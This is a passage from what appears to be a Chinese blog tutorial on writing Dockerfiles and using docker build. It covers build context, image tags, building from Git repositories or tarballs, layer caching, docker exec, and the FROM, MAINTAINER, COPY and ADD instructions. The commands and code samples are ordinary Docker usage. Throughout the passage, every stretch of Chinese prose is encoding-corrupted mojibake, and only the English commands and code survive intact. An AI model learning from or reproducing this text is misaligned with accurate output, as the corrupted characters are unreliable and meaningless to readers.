æ‰€åœ¨ç›®å½•çš„ç›¸å¯¹è·¯å¾„)åˆ°å®¹å™¨é‡Œ <code>&lt;dest&gt;</code></li><li>æŒ‡å®šå·¥ä½œè·¯å¾„ä¸º <code>/app</code></li><li>å®‰è£…ä¾èµ–åŒ…</li><li>æš´éœ² <code>5000</code> ç«¯å£</li><li>å¯åŠ¨ <code>app</code></li></ol><p>è¿™ä¸ªä¾‹å­æ˜¯å¯åŠ¨ä¸€ä¸ª <code>python flask app</code> çš„ <code>Dockerfile</code> ( <code>flask</code> æ˜¯ <code>python</code> çš„ä¸€ä¸ªè½»é‡çš„ web æ¡†æ¶)ï¼Œç›¸ä¿¡å¤§å®¶ä»è¿™ä¸ªä¾‹å­ä¸­èƒ½å¤Ÿç¨å¾®ç†è§£äº†Dockfileçš„ç»„æˆä»¥åŠæŒ‡ä»¤çš„ç¼–å†™è¿‡ç¨‹ã€‚</p><h3 id="æ„å»ºé•œåƒ"><a href="#æ„å»ºé•œåƒ" class="headerlink" title="æ„å»ºé•œåƒ"></a>æ„å»ºé•œåƒ</h3><p>docker build å‘½ä»¤ä¼šæ ¹æ® Dockerfile æ–‡ä»¶åŠä¸Šä¸‹æ–‡æ„å»ºæ–° Docker é•œåƒã€‚æ„å»ºä¸Šä¸‹æ–‡æ˜¯æŒ‡ Dockerfile æ‰€åœ¨çš„<code>æœ¬åœ°è·¯å¾„</code>æˆ–ä¸€ä¸ª<code>URLï¼ˆGitä»“åº“åœ°å€ï¼‰</code>ã€‚æ„å»ºä¸Šä¸‹æ–‡ç¯å¢ƒä¼šè¢«é€’å½’å¤„ç†ï¼Œæ‰€ä»¥æ„å»ºæ‰€æŒ‡å®šçš„è·¯å¾„è¿˜åŒ…æ‹¬äº†å­ç›®å½•ï¼Œè€ŒURLè¿˜åŒ…æ‹¬äº†å…¶ä¸­æŒ‡å®šçš„å­æ¨¡å—ã€‚</p><p>å°†å½“å‰ç›®å½•åšä¸ºæ„å»ºä¸Šä¸‹æ–‡æ—¶ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·ä½¿ç”¨docker buildå‘½ä»¤æ„å»ºé•œåƒï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build </span>.</span><br><span class="line">Sending <span class="keyword">build </span><span class="built_in">context</span> to Docker daemon  <span class="number">6</span>.<span class="number">51</span> MB</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼šæ„å»ºä¼šåœ¨ Docker åå°å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰ä¸­æ‰§è¡Œï¼Œè€Œä¸æ˜¯CLIä¸­ã€‚æ„å»ºå‰ï¼Œæ„å»ºè¿›ç¨‹ä¼šå°†å…¨éƒ¨å†…å®¹ï¼ˆé€’å½’ï¼‰å‘é€åˆ°å®ˆæŠ¤è¿›ç¨‹ã€‚å¤§å¤šæƒ…å†µä¸‹ï¼Œåº”è¯¥å°†ä¸€ä¸ªç©ºç›®å½•ä½œä¸ºæ„å»ºä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå¹¶å°† Dockerfile æ–‡ä»¶æ”¾åœ¨è¯¥ç›®å½•ä¸‹ã€‚</p><p>åœ¨æ„å»ºä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨çš„ Dockerfile æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªæ„å»ºæŒ‡ä»¤æ–‡ä»¶ã€‚ä¸ºäº†æé«˜æ„å»ºæ€§èƒ½ï¼Œå¯ä»¥é€šè¿‡<code>.dockerignore</code>æ–‡ä»¶æ’é™¤ä¸Šä¸‹æ–‡ç›®å½•ä¸‹ä¸éœ€è¦çš„æ–‡ä»¶å’Œç›®å½•ã€‚</p><p>åœ¨ Docker æ„å»ºé•œåƒçš„ç¬¬ä¸€æ­¥ï¼Œdocker CLI ä¼šå…ˆåœ¨ä¸Šä¸‹æ–‡ç›®å½•ä¸­å¯»æ‰¾<code>.dockerignore</code>æ–‡ä»¶ï¼Œæ ¹æ®<code>.dockerignore</code> æ–‡ä»¶æ’é™¤ä¸Šä¸‹æ–‡ç›®å½•ä¸­çš„éƒ¨åˆ†æ–‡ä»¶å’Œç›®å½•ï¼Œç„¶åæŠŠå‰©ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ä¼ é€’ç»™ Docker æœåŠ¡ã€‚</p><p>Dockerfile ä¸€èˆ¬ä½äºæ„å»ºä¸Šä¸‹æ–‡çš„æ ¹ç›®å½•ä¸‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡-fæŒ‡å®šè¯¥æ–‡ä»¶çš„ä½ç½®ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build</span> -f /<span class="keyword">path</span>/<span class="keyword">to</span>/a/Dockerfile .</span><br></pre></td></tr></table></figure><p>æ„å»ºæ—¶ï¼Œè¿˜å¯ä»¥é€šè¿‡-tå‚æ•°æŒ‡å®šæ„å»ºæˆé•œåƒçš„ä»“åº“ã€æ ‡ç­¾ã€‚</p><h3 id="é•œåƒæ ‡ç­¾"><a href="#é•œåƒæ ‡ç­¾" class="headerlink" title="é•œåƒæ ‡ç­¾"></a>é•œåƒæ ‡ç­¾</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t nginx/<span class="built_in">v3</span> .</span><br></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨å¤šä¸ªä»“åº“ä¸‹ï¼Œæˆ–ä½¿ç”¨å¤šä¸ªé•œåƒæ ‡ç­¾ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤šä¸ª-tå‚æ•°ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t nginx/<span class="built_in">v3</span>:<span class="number">1</span>.<span class="number">0</span>.<span class="number">2</span> -t nginx/<span class="built_in">v3</span>:latest .</span><br></pre></td></tr></table></figure><p>åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹æ‰§è¡Œ Dockerfile ä¸­çš„æŒ‡ä»¤å‰ï¼Œé¦–å…ˆä¼šå¯¹ Dockerfile è¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œæœ‰è¯­æ³•é”™è¯¯æ—¶ä¼šè¿”å›ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t nginx/v3 .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line"><span class="keyword">Error </span>response from daemon: Unknown instruction: RUNCMD</span><br></pre></td></tr></table></figure><p><strong>å…¶å®ƒ docker build çš„ç”¨æ³•</strong></p><p><code>ç›´æ¥ç”¨ Git repo è¿›è¡Œæ„å»º</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker build http<span class="variable">s:</span>//github.<span class="keyword">com</span>/twang2218/gitlab-<span class="keyword">ce</span>-zh.git#:<span class="number">11.1</span></span><br><span class="line"></span><br><span class="line">Sending build context <span class="keyword">to</span> Docker daemon <span class="number">2.048</span> kB</span><br><span class="line">Step <span class="number">1</span> : FROM gitlab/gitlab-<span class="keyword">ce</span>:<span class="number">11.1</span>.<span class="number">0</span>-<span class="keyword">ce</span>.<span class="number">0</span></span><br><span class="line"><span class="number">11.1</span>.<span class="number">0</span>-<span class="keyword">ce</span>.<span class="number">0</span>: Pulling from gitlab/gitlab-<span class="keyword">ce</span></span><br><span class="line">aed15891ba52: Already <span class="built_in">exists</span></span><br><span class="line"><span class="number">773</span>ae8583d14: Already <span class="built_in">exists</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è¿™è¡Œå‘½ä»¤æŒ‡å®šäº†æ„å»ºæ‰€éœ€çš„ Git repoï¼Œå¹¶ä¸”æŒ‡å®šé»˜è®¤çš„ master åˆ†æ”¯ï¼Œæ„å»ºç›®å½•ä¸º <code>/11.1/</code>ï¼Œç„¶å Docker å°±ä¼šè‡ªå·±å» git clone è¿™ä¸ªé¡¹ç›®ã€åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ã€å¹¶è¿›å…¥åˆ°æŒ‡å®šç›®å½•åå¼€å§‹æ„å»ºã€‚</p><p><code>ç”¨ç»™å®šçš„ tar å‹ç¼©åŒ…æ„å»º</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> docker build http:<span class="comment">//server/context.tar.gz</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰€ç»™å‡ºçš„ URL ä¸æ˜¯ä¸ª Git repoï¼Œè€Œæ˜¯ä¸ª <code>tar</code> å‹ç¼©åŒ…ï¼Œé‚£ä¹ˆ Docker å¼•æ“ä¼šä¸‹è½½è¿™ä¸ªåŒ…ï¼Œå¹¶è‡ªåŠ¨è§£å‹ç¼©ï¼Œä»¥å…¶ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œå¼€å§‹æ„å»ºã€‚</p><p><code>ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å– Dockerfile è¿›è¡Œæ„å»º</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">build</span> - &lt; Dockerfile <span class="keyword">or</span> cat Dockerfile | docker <span class="keyword">build</span> -</span><br></pre></td></tr></table></figure><p>å¦‚æœæ ‡å‡†è¾“å…¥ä¼ å…¥çš„æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œåˆ™å°†å…¶è§†ä¸º Dockerfileï¼Œå¹¶å¼€å§‹æ„å»ºã€‚è¿™ç§å½¢å¼ç”±äºç›´æ¥ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å– <code>Dockerfile</code> çš„å†…å®¹ï¼Œå®ƒæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œå› æ­¤ä¸å¯ä»¥åƒå…¶ä»–æ–¹æ³•é‚£æ ·å¯ä»¥å°†æœ¬åœ°æ–‡ä»¶ <code>COPY</code> è¿›é•œåƒä¹‹ç±»çš„äº‹æƒ…ã€‚</p><p><code>ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸Šä¸‹æ–‡å‹ç¼©åŒ…è¿›è¡Œæ„å»º</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build - &lt; context<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå‘ç°æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æ ¼å¼æ˜¯ <code>gzip</code>ã€<code>bzip2</code> ä»¥åŠ <code>xz</code> çš„è¯ï¼Œå°†ä¼šä½¿å…¶ä¸ºä¸Šä¸‹æ–‡å‹ç¼©åŒ…ï¼Œç›´æ¥å°†å…¶å±•å¼€ï¼Œå°†é‡Œé¢è§†ä¸ºä¸Šä¸‹æ–‡ï¼Œå¹¶å¼€å§‹æ„å»ºã€‚</p><h3 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h3><p>Docker å®ˆæŠ¤è¿›ç¨‹ä¼šä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œ Dockerfile ä¸­çš„æŒ‡ä»¤ï¼Œè€Œä¸”ä¼šåœ¨æ¯ä¸€æ­¥æäº¤å¹¶ç”Ÿæˆä¸€ä¸ªæ–°é•œåƒï¼Œæœ€åä¼šè¾“å‡ºæœ€ç»ˆé•œåƒçš„IDã€‚ç”Ÿæˆå®Œæˆåï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ä¼šè‡ªåŠ¨æ¸…ç†ä½ å‘é€çš„ä¸Šä¸‹æ–‡ã€‚ Dockerfileæ–‡ä»¶ä¸­çš„æ¯æ¡æŒ‡ä»¤ä¼šè¢«ç‹¬ç«‹æ‰§è¡Œï¼Œå¹¶ä¼šåˆ›å»ºä¸€ä¸ªæ–°é•œåƒï¼Œ<code>RUN cd /tmp</code>ç­‰å‘½ä»¤ä¸ä¼šå¯¹ä¸‹æ¡æŒ‡ä»¤äº§ç”Ÿå½±å“ã€‚ Docker ä¼šé‡ç”¨å·²ç”Ÿæˆçš„ä¸­é—´é•œåƒï¼Œä»¥åŠ é€Ÿdocker buildçš„æ„å»ºé€Ÿåº¦ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨äº†ç¼“å­˜é•œåƒçš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build -t svendowideit/ambassador .</span></span><br><span class="line">Sending build context to Docker daemon 15.36 kB</span><br><span class="line">Step 1/4 : FROM alpine:3.2</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 31f630c65071</span></span><br><span class="line">Step 2/4 : MAINTAINER SvenDowideit@home.org.au</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 2a1c91448f5f</span></span><br><span class="line">Step 3/4 : RUN apk update &amp;&amp;      apk add socat &amp;&amp;        rm -r /var/cache/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 21ed6e7fbb73</span></span><br><span class="line">Step 4/4 : CMD env | grep _TCP= | (sed 's/.*_PORT_\([0-9]*\)_TCP=tcp:\/\/\(.*\):\(.*\)/socat -t 100000000 TCP4-LISTEN:\1,fork,reuseaddr TCP4:\2:\3 \&amp;/' &amp;&amp; echo wait) | sh</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 7ea8aef582cc</span></span><br><span class="line">Successfully built 7ea8aef582cc</span><br></pre></td></tr></table></figure><p>æ„å»ºç¼“å­˜ä»…ä¼šä½¿ç”¨æœ¬åœ°çˆ¶ç”Ÿæˆé“¾ä¸Šçš„é•œåƒï¼Œå¦‚æœä¸æƒ³ä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„é•œåƒï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>--cache-from</code>æŒ‡å®šç¼“å­˜ã€‚æŒ‡å®šåå°†ä¸å†ä½¿ç”¨æœ¬åœ°ç”Ÿæˆçš„é•œåƒé“¾ï¼Œè€Œæ˜¯ä»é•œåƒä»“åº“ä¸­ä¸‹è½½ã€‚</p><h3 id="å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘"><a href="#å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘" class="headerlink" title="å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘"></a>å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘</h3><p>Docker å¯»æ‰¾ç¼“å­˜çš„é€»è¾‘å…¶å®å°±æ˜¯æ ‘å‹ç»“æ„æ ¹æ® Dockerfile æŒ‡ä»¤éå†å­èŠ‚ç‚¹çš„è¿‡ç¨‹ã€‚ä¸‹å›¾å¯ä»¥è¯´æ˜è¿™ä¸ªé€»è¾‘ã€‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> FROM base_image:<span class="keyword">version</span>           Dockerfile:</span><br><span class="line">           +----------+                FROM base_image:<span class="keyword">version</span></span><br><span class="line">           |base image|                <span class="keyword">RUN</span> cmd1  --&gt; <span class="keyword">use</span> cache because we found base image</span><br><span class="line">           +-----X----+                <span class="keyword">RUN</span> cmd11 --&gt; <span class="keyword">use</span> cache because we found cmd1</span><br><span class="line">                / \</span><br><span class="line">               /   \</span><br><span class="line">       <span class="keyword">RUN</span> cmd1     <span class="keyword">RUN</span> cmd2           Dockerfile:</span><br><span class="line">       +------+     +------+           FROM base_image:<span class="keyword">version</span></span><br><span class="line">       |image1|     |image2|           <span class="keyword">RUN</span> cmd2  --&gt; <span class="keyword">use</span> cache because we found base image</span><br><span class="line">       +---X--+     +------+           <span class="keyword">RUN</span> cmd21 --&gt; not <span class="keyword">use</span> cache because there's <span class="keyword">no</span> child node</span><br><span class="line">          / \                                        running cmd21, <span class="keyword">so</span> we build a new image here</span><br><span class="line">         /   \</span><br><span class="line"><span class="keyword">RUN</span> cmd11     <span class="keyword">RUN</span> cmd12</span><br><span class="line">+-------+     +-------+</span><br><span class="line">|image11|     |image12|</span><br><span class="line">+-------+     +-------+</span><br></pre></td></tr></table></figure><p>å¤§éƒ¨åˆ†æŒ‡ä»¤å¯ä»¥æ ¹æ®ä¸Šè¿°é€»è¾‘å»å¯»æ‰¾ç¼“å­˜ï¼Œé™¤äº† ADD å’Œ COPY ã€‚è¿™ä¸¤ä¸ªæŒ‡ä»¤ä¼šå¤åˆ¶æ–‡ä»¶å†…å®¹åˆ°é•œåƒå†…ï¼Œé™¤äº†æŒ‡ä»¤ç›¸åŒä»¥å¤–ï¼ŒDocker è¿˜ä¼šæ£€æŸ¥æ¯ä¸ªæ–‡ä»¶å†…å®¹æ ¡éªŒ(ä¸åŒ…æ‹¬æœ€åä¿®æ”¹æ—¶é—´å’Œæœ€åè®¿é—®æ—¶é—´)ï¼Œå¦‚æœæ ¡éªŒä¸ä¸€è‡´ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç¼“å­˜ã€‚</p><p>é™¤äº†è¿™ä¸¤ä¸ªå‘½ä»¤ï¼ŒDocker å¹¶ä¸ä¼šå»æ£€æŸ¥å®¹å™¨å†…çš„æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚ <code>RUN apt-get -y update</code>ï¼Œæ¯æ¬¡æ‰§è¡Œæ—¶æ–‡ä»¶å¯èƒ½éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯ Docker è®¤ä¸ºå‘½ä»¤ä¸€è‡´ï¼Œä¼šç»§ç»­ä½¿ç”¨ç¼“å­˜ã€‚è¿™æ ·ä¸€æ¥ï¼Œä»¥åæ„å»ºæ—¶éƒ½ä¸ä¼šå†é‡æ–°è¿è¡Œapt-get -y updateã€‚</p><p>å¦‚æœ Docker æ²¡æœ‰æ‰¾åˆ°å½“å‰æŒ‡ä»¤çš„ç¼“å­˜ï¼Œåˆ™ä¼šæ„å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼Œå¹¶ä¸”ä¹‹åçš„æ‰€æœ‰æŒ‡ä»¤éƒ½ä¸ä¼šå†å»å¯»æ‰¾ç¼“å­˜ã€‚</p><h3 id="ä¿®æ”¹å®¹å™¨å†…å®¹"><a href="#ä¿®æ”¹å®¹å™¨å†…å®¹" class="headerlink" title="ä¿®æ”¹å®¹å™¨å†…å®¹"></a>ä¿®æ”¹å®¹å™¨å†…å®¹</h3><p>å®¹å™¨å¯åŠ¨åï¼Œéœ€è¦å¯¹å®¹å™¨å†…çš„æ–‡ä»¶è¿›è¡Œè¿›ä¸€æ­¥çš„å®Œå–„ï¼Œå¯ä»¥ä½¿ç”¨docker exec -it xx bashå‘½ä»¤å†æ¬¡è¿›è¡Œä¿®æ”¹ï¼Œä»¥ä¸Šé¢çš„ç¤ºä¾‹ä¸ºåŸºç¡€ï¼Œä¿®æ”¹ nginx å¯åŠ¨é¡µé¢å†…å®¹ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker_nginx_v1   bash</span><br><span class="line">root<span class="variable">@3729b97e8226</span><span class="symbol">:/</span><span class="comment"># echo '&lt;h1&gt;Hello, Docker neo!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html</span></span><br><span class="line">root<span class="variable">@3729b97e8226</span><span class="symbol">:/</span><span class="comment"># exit</span></span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>ä»¥äº¤äº’å¼ç»ˆç«¯æ–¹å¼è¿›å…¥ docker_nginx_v1 å®¹å™¨ï¼Œå¹¶æ‰§è¡Œäº† bash å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯è·å¾—ä¸€ä¸ªå¯æ“ä½œçš„ Shellã€‚</p><p>ä¿®æ”¹äº†å®¹å™¨çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ”¹åŠ¨äº†å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œå¯ä»¥é€šè¿‡ docker diff å‘½ä»¤çœ‹åˆ°å…·ä½“çš„æ”¹åŠ¨</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker diff docker_nginx_v1 </span><br><span class="line"><span class="keyword">...</span></span><br></pre></td></tr></table></figure><h3 id="Dockerfileå¸¸ç”¨æŒ‡ä»¤"><a href="#Dockerfileå¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="Dockerfileå¸¸ç”¨æŒ‡ä»¤"></a>Dockerfileå¸¸ç”¨æŒ‡ä»¤</h3><p>æ ¹æ®ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»å·®ä¸å¤šçŸ¥é“äº†Dockerfileçš„ç»„æˆä»¥åŠæŒ‡ä»¤çš„ç¼–å†™è¿‡ç¨‹ï¼Œæˆ‘ä»¬å†æ¥ç†è§£ä¸€ä¸‹è¿™äº›å¸¸ç”¨å‘½ä»¤å°±ä¼šå¾—å¿ƒåº”æ‰‹äº†ã€‚</p><p>ç”±äº <code>Dockerfile</code> ä¸­æ‰€æœ‰çš„å‘½ä»¤éƒ½æ˜¯ä»¥ä¸‹æ ¼å¼ï¼š<code>INSTRUCTION argument</code> ï¼ŒæŒ‡ä»¤ <code>(INSTRUCTION)</code> ä¸åˆ†å¤§å°å†™ï¼Œä½†æ˜¯æ¨èå¤§å†™ï¼Œå’Œsqlè¯­å¥æ˜¯ä¸æ˜¯å¾ˆç›¸ä¼¼å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬æ­£å¼æ¥è®²è§£ä¸€ä¸‹è¿™äº›æŒ‡ä»¤é›†å§ã€‚</p><p><strong>FROM</strong></p><p><code>FROM</code> æ˜¯ç”¨äºæŒ‡å®šåŸºç¡€çš„ <code>images</code> ï¼Œä¸€èˆ¬æ ¼å¼ä¸º <code>FROM &lt;image&gt;</code> or <code>FORM &lt;image&gt;:&lt;tag&gt;</code> ï¼Œæ‰€æœ‰çš„ <code>Dockerfile</code> éƒ½ç”¨è¯¥ä»¥ <code>FROM</code> å¼€å¤´ï¼Œ<code>FROM</code> å‘½ä»¤æŒ‡æ˜ <code>Dockerfile</code> æ‰€åˆ›å»ºçš„é•œåƒæ–‡ä»¶ä»¥ä»€ä¹ˆé•œåƒä¸ºåŸºç¡€ï¼Œ<code>FROM</code> ä»¥åçš„æ‰€æœ‰æŒ‡ä»¤éƒ½ä¼šåœ¨ <code>FROM</code> çš„åŸºç¡€ä¸Šè¿›è¡Œåˆ›å»ºé•œåƒã€‚å¯ä»¥åœ¨åŒä¸€ä¸ª <code>Dockerfile</code> ä¸­å¤šæ¬¡ä½¿ç”¨ <code>FROM</code> å‘½ä»¤ç”¨äºåˆ›å»ºå¤šä¸ªé•œåƒã€‚æ¯”å¦‚æˆ‘ä»¬è¦æŒ‡å®š <code>python 2.7</code> çš„åŸºç¡€é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥åƒå¦‚ä¸‹å†™æ³•ä¸€æ ·ï¼š</p><figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span></span><br></pre></td></tr></table></figure><p><strong>MAINTAINER</strong></p><p>MAINTAINER æ˜¯ç”¨äºæŒ‡å®šé•œåƒåˆ›å»ºè€…å’Œè”ç³»æ–¹å¼ï¼Œä¸€èˆ¬æ ¼å¼ä¸º <code>MAINTAINER &lt;name&gt;</code> ã€‚è¿™é‡Œæˆ‘è®¾ç½®æˆæˆ‘çš„ ID å’Œé‚®ç®±ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">MAINTAINER</span> <span class="selector-tag">QYMUA</span> &lt;<span class="selector-tag">qymuao3o</span>@<span class="keyword">gmail</span>.<span class="keyword">com</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>COPY</strong></p><p>COPY æ˜¯ç”¨äºå¤åˆ¶æœ¬åœ°ä¸»æœºçš„ <code>&lt;src&gt;</code> (ä¸º Dockerfile æ‰€åœ¨ç›®å½•çš„ç›¸å¯¹è·¯å¾„)åˆ°å®¹å™¨ä¸­çš„ <code>&lt;dest&gt;</code>ã€‚</p><p>å½“ä½¿ç”¨æœ¬åœ°ç›®å½•ä¸ºæºç›®å½•æ—¶ï¼Œæ¨èä½¿ç”¨ COPY ã€‚ä¸€èˆ¬æ ¼å¼ä¸º <code>COPY &lt;src&gt;&lt;dest&gt;</code> ã€‚ä¾‹å¦‚æˆ‘ä»¬è¦æ‹·è´å½“å‰ç›®å½•åˆ°å®¹å™¨ä¸­çš„ /app ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ“ä½œï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> . /app</span></span><br></pre></td></tr></table></figure><p>å’Œ RUN æŒ‡ä»¤ä¸€æ ·ï¼Œä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§ç±»ä¼¼äºå‘½ä»¤è¡Œï¼Œä¸€ç§ç±»ä¼¼äºå‡½æ•°è°ƒç”¨=&gt;<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;æºè·¯å¾„1&gt;&quot;,... &quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;]</code></p><p><strong>ADD(æ›´é«˜çº§çš„å¤åˆ¶æ–‡ä»¶)</strong></p><p>ADD æŒ‡ä»¤å’Œ COPY çš„æ ¼å¼å’Œæ€§è´¨åŸºæœ¬ä¸€è‡´ã€‚ä½†æ˜¯åœ¨ COPY åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›åŠŸèƒ½ã€‚</p><p>æ¯”å¦‚ <code>&lt;æºè·¯å¾„&gt;</code> å¯ä»¥æ˜¯ä¸€ä¸ª URLï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒDocker å¼•æ“ä¼šè¯•å›¾å»ä¸‹è½½è¿™ä¸ªé“¾æ¥çš„æ–‡ä»¶æ”¾åˆ° &lt;ç›®æ ‡è·¯å¾„&gt; å»ã€‚ä¸‹è½½åçš„æ–‡ä»¶æƒé™è‡ªåŠ¨è®¾ç½®ä¸º 600ï¼Œå¦‚æœè¿™å¹¶ä¸æ˜¯æƒ³è¦çš„æƒé™ï¼Œé‚£ä¹ˆè¿˜éœ€è¦å¢åŠ é¢å¤–çš„ä¸€å±‚ RUN è¿›è¡Œæƒé™è°ƒæ•´ï¼Œå¦å¤–ï¼Œå¦‚æœä¸‹è½½çš„æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œéœ€è¦è§£å‹ç¼©ï¼Œä¹Ÿä¸€æ ·è¿˜éœ€è¦é¢å¤–çš„ä¸€å±‚ RUN æŒ‡ä»¤è¿›è¡Œè§£å‹ç¼©ã€‚æ‰€ä»¥ä¸å¦‚ç›´æ¥ä½¿ç”¨ RUN æŒ‡ä»¤ï¼Œç„¶åä½¿ç”¨ wget æˆ–è€… curl å·¥å…·ä¸‹è½½ï¼Œå¤„ç†æƒé™ã€è§£å‹ç¼©ã€ç„¶åæ¸…ç†æ— ç”¨æ–‡ä»¶æ›´åˆç†ã€‚å› æ­¤ï¼Œè¿™ä¸ªåŠŸèƒ½å…¶å®å¹¶ä¸å®ç”¨ï¼Œè€Œä¸”ä¸æ¨èä½¿ç”¨ã€‚</p><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒADD 